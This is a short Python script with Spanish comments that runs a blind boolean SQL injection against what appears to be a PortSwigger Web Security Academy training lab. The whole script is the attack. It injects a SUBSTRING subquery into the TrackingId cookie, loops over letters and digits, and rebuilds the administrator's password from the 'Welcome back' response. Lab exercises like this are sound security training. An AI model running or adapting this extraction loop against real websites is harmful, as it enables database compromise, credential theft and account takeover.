import requests

# URL a la que se realizará la solicitud
url = "https://0afc006803e4bc4780b80d6400a40044.web-security-academy.net/filter?category=Toys+%26+Games"
 # Puedes cambiar este valor a la letra que quieras probar
chars = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'
]
#n=1
# Crear la consulta SQL inyectada
#tracking_id = f"bODfna3mB4soHqcW' AND (SELECT SUBSTRING(password,{n},1) FROM users WHERE username='administrator')='{chars[24]}"
# Definir las cookies con inyeccion


# Definir las cabeceras
headers = {
    'Sec-Ch-Ua': '"Chromium";v="129", "Not=A?Brand";v="8"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"macOS"',
    'Accept-Language': 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://0a1800bf0401779287f4b5990076002b.web-security-academy.net/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Priority': 'u=0, i'
}
passw= ""
# Realizar la solicitud GET

# Imprimir la respuesta
search_string = "Welcome back"

# Verificar si el string está en la respuesta
x=1
while x<21:
    for char in chars:
        tracking_id = f"bODfna3mB4soHqcW' AND (SELECT SUBSTRING(password,{x},1) FROM users WHERE username='administrator')='{char}"
        cookies = {
    'TrackingId': tracking_id,
    'session': 'gxiREUx0szXcL5j4lZaxFxbIeXM10Qg4'
}
        response = requests.get(url, headers=headers, cookies=cookies)
        if search_string in response.text:
            passw=passw+char
            break
        else:
            pass
    x+=1
    print(passw)